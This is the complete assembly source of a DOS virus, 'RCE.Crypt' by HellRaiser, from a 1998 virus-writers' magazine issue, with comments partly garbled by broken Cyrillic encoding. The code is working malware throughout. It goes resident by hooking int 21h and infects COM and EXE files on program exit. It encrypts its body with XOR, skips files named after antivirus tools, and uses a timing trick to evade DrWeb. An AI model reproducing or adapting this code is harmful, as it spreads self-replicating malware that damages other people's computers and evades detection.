;
;      ��                  �
;     ���  Virus Magazine  � Box 176, Kiev 210, Ukraine      IV   1998
;     ��� ���������������� � ������������������� � ��������  ���������
;      �� ��� ��� ��� ��� ��� ��� ���    � � ��� � ��� ���   � � ��� �
;       � � � ��  ��  �    �  ��  � �    � � � � � �   �     � � ��� �
;       � � � �   ��� ���  �  ��� ���     �� ��� � ��� ����  � � ��� �
;       � ����������������� �������������������������������  ���������
;          (C) Copyright, 1994-98, by STEALTH group WorldWide, unLtd.
;
;
;  RCE.Crypt �����. ���������� ��⮤� ��ࠦ���� �� fn. 4ch int 21h
;
;                                                  (c) HellRaiser
;
; This is a crypt resident COM-EXE virus
; that doesn't infect some files
; Files are infected on f.4Ch int 21h
; With a trick against DrWeb

.model tiny
.code
LVir equ offset endvir - offset start
LVirPar equ (2*LVir)/10h+1+10h

org 100h

start1:
       jmp start
       db 'H'
start:
        call $+3
        pop si
        sub si,3  ; si  = start
        push si
; � ⥯��� ����஢�� !!!
        mov di,offset CryptVirus - offset start
        add di,si
        mov cx,offset CryptEnd - offset CryptVirus
        db 0b4h
Key     db 00h
decrypt:
        xor byte ptr cs:[di],ah
        inc di
push ax
in ax,42h
mov bx,ax
in ax,42h
cmp bx,ax
je cont_xx
db '�������� - ��������'
cont_xx:
pop ax
        loop decrypt
CryptVirus:
; �஢�ਬ, ��㤠 ���⮢���
        cmp word ptr cs:[si + offset Header - offset start],'ZM'
        je label6
        mov ax,cs:[si + offset Header - offset start]
        mov bx,cs:[si + offset Header - offset start + 2]
        mov cs:[100h],ax
        mov cs:[102h],bx
        jmp Cont1
label6:
        mov ax,ds
        add ax,10h
        push ax
        db 05h
OldSS   dw ?
        mov cs:[si + offset SS_File - offset start],ax
        db 0b8h
OldSP   dw ?
        mov cs:[si + offset SP_File - offset start],ax
        pop ax
        db 05h
OldCS   dw ?
        mov cs:[si + offset CS_File - offset start],ax
        db 0b8h
OldIP   dw ?
        mov cs:[si + offset IP_File - offset start],ax
Cont1:
; �஢�ਬ, � ����� �� ��
        mov ax,0fe09h
        int 21h
        cmp ax,09feh
        je run_carrier
; ��� ���� ���, �� ᥩ�� �㤥�
        mov ax,ds
        dec ax
        mov es,ax   ; ds=PSP, es=MCB
        sub word ptr ds:[02],LVirPar
        sub word ptr es:[03],LVirPar
        mov es,ds:[02]
; ��४�稢��� ᥡ�
        push ds
        push cs
        pop ds
        xor di,di
        mov cx,LVir
        rep movsb
; �⠢�� int 21h
        push es
        pop ds
        push es
        push bx
        mov ax,3521h
        int 21h
        mov ds:[offset Int21Vec - offset start],bx
        mov ds:[offset Int21Vec - offset start +2],es
        pop bx
        pop es
        mov dx,ds
        mov ds:[offset My21Seg - offset start],dx
        mov dx,offset Int21Hand - offset start
        mov ds:[offset My21Off - offset start],dx
        sub ah,10h
        int 21h
        pop ds
; �室��
Run_Carrier:
        push ds
        pop es
        pop si
; ��㤠 ���⮢��� ?
        cmp word ptr cs:[si + offset Header - offset start],'ZM'
        je RunEXE
; ���⮢��� �� COM
        mov di,100h
        push di
        ret
; ���⮢��� �� EXE
RunEXE:
        cli
        db 0b8h
SS_File dw ?
        mov ss,ax
        db 0bch
SP_File dw ?
        sti
        db 0eah
IP_File dw ?
CS_File dw ?
; ��ࠡ��稪 int 21h
Int21Hand:
        cmp ah,0feh   ; ��� ��訢���
        jne Process
        xchg ah,al
        iret            ; �⢥砥�
Process:
        cmp ah,4ch
        je Process2    ; ⮣�� � ���
Origin21h:
        db 0eah
Int21Vec dw ?
         dw ?
Process2:
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push es
        push ds
; ����⠭���� �ਣ������ ��ࠡ��稪 int 21h
        cli
        xor ax,ax
        mov es,ax
        mov ax,cs:[offset Int21Vec - offset start]
        mov es:[21h*4],ax
        mov ax,cs:[offset Int21Vec - offset start + 2]
        mov es:[21h*4+2],ax
        sti
; �饬
        mov ax,5d06h
        int 21h
        mov ax,ds:[si+10h]
        mov es,ax   ; ES = PSP
        mov ax,es:[2ch]
        mov ds,ax
        xor si,si  ; DS:SI = Environment
Find:
        cmp byte ptr ds:[si],0
        je Cont11
RepFind:
        inc si
        jmp Find
Cont11:
        cmp byte ptr ds:[si+1],0
        jne RepFind
        cmp byte ptr ds:[si+2],1
        jne RepFind
        cmp byte ptr ds:[si+3],0
        jne RepFind
        add si,4
        mov dx,si
; �஢�ਬ �� ����ࠦ���� 䠩��
        cld
        push ds
        pop es
        mov di,dx
        mov cl,0ffh
        xor al,al
        repne scasb
        std
        mov al,'\'
        repne scasb
        mov ax,es:[di][2]
        cld
        cmp ax,'RD'
        je ExitHand
        cmp ax,'IA'
        je ExitHand
        cmp ax,'DA'
        je ExitHand
        cmp ax,'OC'
        je ExitHand
        cmp ax,'VA'
        je ExitHand
        cmp ax,'PF'
        je ExitHand
        cmp ax,'BT'
        je ExitHand
        cmp ax,'CS'
        jne ContProcess
ExitHand:
; ��୥� ��� ��ࠡ��稪 int 21h
        cli
        xor ax,ax
        mov es,ax
        mov ax,cs:[offset My21Off - offset start]
        mov es:[21h*4],ax
        mov ax,cs:[offset My21Seg - offset start]
        mov es:[21h*4+2],ax
        sti
; ��୥� ॣ�����
        pop ds
        pop es
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        jmp Origin21h
; �⠢�� ��ࠡ��稪 int 24h
ContProcess:
        push ds
        push dx
        mov ax,3524h
        int 21h
        mov cs:[offset Int24Off - offset start],bx
        mov cs:[offset Int24Seg - offset start],es
        mov dx,offset Int24Hand - offset start
        sub ah,10h
        int 21h
        pop dx
        pop ds
; ��஥� 䠩�
        mov ax,3d02h
        int 21h
        jnc Process3
        jmp Exit
; �⠥� ���������
Process3:
push cs
pop ds
        mov bx,ax
        mov ah,3fh
        mov cx,18h
        mov dx,offset Header - offset start
        int 21h
        jnc Cont_XXX
CloseFile:
; ����뢠�� 䠩�
        mov ah,3eh
        int 21h
Exit:
; �⠢�� �� ���� int 24h
        mov dx,cs:[offset Int24Seg - offset start]
        mov ds,dx
        mov dx,cs:[offset Int24Off - offset start]
        mov ax,2524h
        int 21h
        jmp ExitHand
; date & time
Cont_XXX:
        mov ax,5700h
        int 21h
        mov cs:[time - start],cx
        mov cs:[time - start + 2],dx
; �஢�ਬ �� ��ࠦ�������
        cmp cs:[offset CheckSum - offset start],'HR'
        je CloseFIle
        cmp cs:[offset Header - offset start],'ZM'
        je label7
        jmp InfectCom
; ���� � ����� 䠩��
label7:
        mov ax,4202h
        xor cx,cx
        xor dx,dx
        int 21h
; ��࠭�� �����
        mov cs:[offset reallen - offset start],ax
        mov cs:[offset reallen - offset start + 2],dx
; �஢�ઠ �� ���૥�
        push dx
        push ax
        mov cx,200h
        div cx
        or dx,dx
        jz label1
        inc ax
label1:
        cmp ax,cs:[offset PageCnt - offset start]
        jne Rest
        cmp dx,cs:[offset PartPage - offset start]
        je label5
Rest:
        pop ax
        pop dx
        jmp CloseFile
; ��࠭�� CS:IP
label5:
        mov ax,cs:[offset EXE_CS - offset start]
        mov cs:[offset OldCS - offset start],ax
        mov ax,cs:[offset EXE_IP - offset start]
        mov cs:[offset OldIP - offset start],ax
        mov ax,cs:[offset EXE_SS - offset start]
        mov cs:[offset OldSS - offset start],ax
        mov ax,cs:[offset EXE_SP - offset start]
        mov cs:[offset OldSP - offset start],ax
; ����६ �� �⥪�
        pop ax
        pop dx
; ���᫨� ����� �����
        add ax,LVir
        adc dx,0
        mov cx,200h
        div cx
        or dx,dx
        jz label2
        inc ax
; ���ᥬ �� � ���������
label2:
        mov cs:[offset PageCnt - offset start],ax
        mov cs:[offset PartPage - offset start],dx
; ���᫨� ��� �室�
        mov ax,cs:[offset reallen - offset start]
        mov dx,cs:[offset reallen - offset start + 2]
        mov cx,10h
        div cx
        sub ax,cs:[offset HdrPar - offset start]
        sbb dx,0
        mov cs:[offset EXE_CS - offset start],ax
        mov cs:[offset EXE_IP - offset start],dx
        mov cs:[offset EXE_SS - offset start],ax
        mov ax,LVir + 100h
        mov cs:[offset EXE_SP - offset start],ax
; ���⠢�� �ਧ��� ��ࠦ������
        mov cs:[offset CheckSum - offset start],'HR'
        call WriteVirus
; ����⠭���� ���� � �६�
label4:
        mov ax,5701h
        mov cx,es:[time - start]
        mov dx,es:[time - start +2]
        int 21h
        jmp CloseFile
;  � ����� �㤥� ��ࠦ��� COM
InfectCom:
; �஢�ਬ, � �� ��ࠦ�� �� �� 㦥 ?
        cmp byte ptr cs:[offset Header - offset start],90h
        je CloseFileJump
        cmp byte ptr cs:[offset Header - offset start +3],'H'
        je CloseFileJump
; ���� � ����� 䠩��
        xor cx,cx
        xor dx,dx
        mov ax,4202h
        int 21h
; �஢�ਬ ����� 䠩��
        cmp ax,3*LVir
        jna CloseFileJump
        cmp ax,65535 - 3*LVir
        ja CloseFileJump
        sub ax,3
        mov cs:[offset JmpAdr - offset start],ax
        call WriteVirus
        jmp label4
CloseFileJump:
        jmp CloseFile
; ��楤�� ����� � 䠩�
WriteVirus:
        push cs
        pop ds
        push cs
        pop es
        xor si,si
        mov di,LVir
        mov cx,di
        cld
        rep movsb
        add si,offset CryptVirus - offset start
        mov ax,cs:[offset Header - offset start + 10]
        mov cs:[LVir + offset Key - offset start],al
        mov cx,offset CryptEnd - offset CryptVirus
crypt:
        xor byte ptr [si],al
        inc si
        loop crypt
; � ⥯��� ��襬�� � 䠩� ⥫��
        cmp word ptr cs:[offset Header - offset start],'ZM'
        jne WriteCom
; ��襬 ⥫�
        mov ah,40h
        mov cx,LVir
        mov dx,cx
        int 21h
        jnc label3
        jmp CloseFile
; ���� � ��砫� � ��襬 ���������
label3:
        mov ax,4200h
        xor cx,cx
        xor dx,dx
        int 21h
        mov cx,18h
        mov ah,40h
        mov dx,offset Header - offset start
        int 21h
        jnc label_a
        jmp CloseFile
label_a:
        ret
WriteCom:
; ��襬�� � ����� 䠩��
        mov ah,40h
        mov cx,LVir
        mov dx,cx
        int 21h
; ���� � ��砫� � ��襬 �㤠 jmp
        xor cx,cx
        xor dx,dx
        mov ax,4200h
        int 21h
        mov ah,40h
        mov cx,4
        mov dx,offset NewBytes - offset start
        int 21h
        ret
; ��ࠡ��稪 int 24h
Int24Hand:
        mov al,3
        iret
; ����� �ணࠬ��
My21Off  dw ?
My21Seg  dw ?
NewBytes db 0e9h
JmpAdr   dw 0000
         db 'H'
Int24Off  dw ?
Int24Seg  dw ?
Header          dw 4cb4h
PartPage        dw 21cdh
PageCnt         dw ?
                dw ?
HdrPar          dw ?
                dw ?
                dw ?
EXE_SS          dw ?
EXE_SP          dw ?
CheckSum        dw ?
EXE_IP          dw ?
EXE_CS          dw ?
time    dw ?
        dw ?
reallen dw ?
        dw ?
CryptEnd:
Copyright db '(Cl) HellRaiser 1997','$'
endvir:
end start1